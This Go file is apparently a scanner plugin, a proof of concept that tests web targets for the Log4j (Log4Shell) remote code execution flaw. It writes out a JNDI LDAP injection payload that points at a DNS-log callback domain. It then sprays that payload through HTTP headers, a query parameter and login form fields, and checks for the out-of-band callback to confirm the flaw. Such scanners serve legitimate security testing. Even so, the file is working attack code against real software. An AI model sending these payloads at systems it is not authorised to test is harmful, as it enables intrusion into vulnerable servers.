package mypocs

import (
	"fmt"
	plugin "github.com/deenrookie/kunpeng-plus/pocs"
	"github.com/deenrookie/kunpeng-plus/utils"
	"github.com/opensec-cn/kunpeng/util"
	"net/http"
	"strings"
	"time"
)

type log4jRCE struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("log4j", &log4jRCE{})
}

func (d *log4jRCE) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "log4j RCE",
		Remarks: "log4j 远程命令执行",
		Level:   0,
		Type:    "RCE",
		Author:  "Deen",
		References: plugin.References{
			URL:  "https://www.anquanke.com/post/id/262670",
			CVE:  "",
			KPID: "KP-1002",
		},
	}
	return d.info
}

func (d *log4jRCE) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}

func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
	_ = meta

	randStr := utils.RandStringRunes(8)
	mainPayload := fmt.Sprintf("${lower:${jndi:ldap://%s.%s/}}", randStr, utils.DNS_LOG_DOMAIN)

	request, _ := http.NewRequest("GET", URL, nil)
	request.Header.Set("X-Forwarded-For", mainPayload)
	request.Header.Set("Client-ip", mainPayload)
	request.Header.Set("Cookie", mainPayload)
	_, _ = util.RequestDo(request, true)

	request, _ = http.NewRequest("GET", URL+"?id="+mainPayload, nil)
	request.Header.Set("X-Forwarded-For", mainPayload)
	request.Header.Set("Client-ip", mainPayload)
	request.Header.Set("Cookie", mainPayload)
	_, _ = util.RequestDo(request, true)

	postData := fmt.Sprintf("payload=%s&username=%s&password=%s&character_encoding=UTF-8", mainPayload, mainPayload, mainPayload)
	request, _ = http.NewRequest("POST", URL, strings.NewReader(postData))
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	_, _ = util.RequestDo(request, true)

	postData = fmt.Sprintf("payload=%s&username=%s&password=%s&character_encoding=UTF-8", mainPayload, mainPayload, mainPayload)
	request, _ = http.NewRequest("POST", URL+"/login", strings.NewReader(postData))
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	_, _ = util.RequestDo(request, true)

	time.Sleep(time.Duration(1) * time.Second)

	if utils.IsExistDNSLog(randStr) {
		result := d.info
		result.Response = "TEST"
		result.Request = "TEST"
		d.result = append(d.result, result)
		return true
	}
	return false
}
